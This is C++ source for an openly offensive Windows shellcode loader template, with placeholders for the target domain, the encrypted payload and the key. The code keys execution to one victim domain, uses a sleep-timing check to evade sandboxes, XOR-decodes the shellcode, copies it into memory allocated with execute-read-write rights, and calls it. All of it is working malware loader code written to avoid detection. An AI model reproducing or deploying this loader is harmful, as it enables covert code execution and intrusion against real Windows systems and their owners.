#include <windows.h>
#include <iostream>
#include <chrono>
#include <thread>

int main(int argc, char **argv) {

    const char* fqdn = std::getenv("USERDNSDOMAIN");
    const char* targetDomain = "${domain}";

    if (fqdn && _stricmp(fqdn, targetDomain) != 0) {
        return 0;
    }

    using namespace std::chrono_literals;

    auto t1 = std::chrono::steady_clock::now();
    std::this_thread::sleep_for(5s);
    auto t2 = std::chrono::steady_clock::now();
    double deltaT = std::chrono::duration<double>(t2 - t1).count();
    if (deltaT < 4.5)
    {
        return 0;
    }

	// Encrypted shellcode and cipher key obtained from shellcode_encoder.py
	char encryptedShellcode[] = "${shellcode}";
	char key[] = "${key}";

	// Char array to host the deciphered shellcode
	char shellcode[sizeof encryptedShellcode];	
	

	// XOR decoding stub using the key defined above must be the same as the encoding key
	int j = 0;
	for (int i = 0; i < sizeof encryptedShellcode; i++) {
		if (j == sizeof key - 1) j = 0;

		shellcode[i] = encryptedShellcode[i] ^ key[j];
		j++;
	}

	// Allocating memory with EXECUTE writes
	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copying deciphered shellcode into memory as a function
	memcpy(exec, shellcode, sizeof shellcode);

	// Call the shellcode
	((void(*)())exec)();
}
